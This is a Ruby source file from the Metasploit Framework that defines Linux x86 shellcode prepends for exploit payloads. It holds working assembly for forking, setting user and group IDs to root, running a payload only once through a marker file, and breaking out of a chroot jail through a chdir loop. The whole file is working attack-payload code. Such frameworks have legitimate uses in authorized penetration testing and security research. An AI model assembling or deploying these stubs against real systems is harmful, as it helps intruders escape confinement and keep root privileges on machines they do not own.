#
# Linux x86 prepends
#
module Msf::Payload::Linux::X86::Prepends
  include Msf::Payload::Linux::Prepends
  def prepends_order
    %w[PrependExecOnce PrependFork PrependSetresuid PrependSetreuid PrependSetuid PrependSetresgid PrependSetregid PrependSetgid PrependChrootBreak]
  end

  def appends_order
    %w[AppendExit]
  end

  def prepends_map
    @prepends_map ||= {
      'PrependExecOnce' => prepend_exec_once,
      'PrependFork' => x86_assemble(%(
        push 2
        pop eax
        int 0x80
        test eax, eax
        jz child
      parent:
        xor eax, eax
        mov al, 1
        int 0x80
      child:
        mov al, 0x42
        int 0x80
        push 2
        pop eax
        int 0x80
        test eax, eax
        jnz parent
      )),
      'PrependSetresuid' => x86_assemble(%(
        xor ecx, ecx
        xor ebx, ebx
        mul ebx
        mov al, 0xa4
        int 0x80
      )),
      'PrependSetreuid' => x86_assemble(%(
        xor ecx, ecx
        xor ebx, ebx
        push 0x46
        pop eax
        int 0x80
      )),
      'PrependSetuid' => x86_assemble(%(
        xor ebx, ebx
        push 0x17
        pop eax
        int 0x80
      )),
      'PrependSetresgid' => x86_assemble(%(
        xor ecx, ecx
        xor ebx, ebx
        mul ebx
        mov al, 0xaa
        int 0x80
      )),
      'PrependSetregid' => x86_assemble(%(
        xor ecx, ecx
        xor ebx, ebx
        push 0x47
        pop eax
        int 0x80
      )),
      'PrependSetgid' => x86_assemble(%(
        xor ebx, ebx
        push 0x2e
        pop eax
        int 0x80
      )),
      'PrependChrootBreak' => x86_assemble(%(
        xor ecx, ecx
        xor ebx, ebx
        push 0x46
        pop eax
        int 0x80
        push 0x3d
        mov ebx, esp
        push 0x27
        pop eax
        int 0x80
        mov ecx, ebx
        pop eax
        int 0x80
        xor eax, eax
        push eax
        sub esp, 2
        mov word [esp], 0x2e2e
        mov ebx, esp
        push 0x3d
        pop ecx
      chdir_loop:
        mov al, 0xc
        int 0x80
        loop chdir_loop
        push 0x3d
        mov ecx, ebx
        pop eax
        int 0x80
      ))
    }
  end

  def appends_map
    @appends_map ||= {
      'AppendExit' => x86_assemble(%(
        xor ebx, ebx
        push 1
        pop eax
        int 0x80
      ))
    }
  end

  private

  def prepend_exec_once
    @prepend_exec_once ||= x86_assemble(%(
      jmp marker
    open_marker:
      pop ebx
      mov ecx, 0xc1
      mov edx, 0x180
      mov eax, 5
      int 0x80
      test eax, eax
      js stop
      mov ebx, eax
      mov eax, 6
      int 0x80
      jmp payload
    stop:
      xor ebx, ebx
      mov eax, 1
      int 0x80
    marker:
      call open_marker
      db '#{prepend_exec_once_path}', 0
    payload:
    ))
  end

  def x86_assemble(source)
    Metasm::Shellcode.assemble(Metasm::Ia32.new, source).encode_string
  end
end
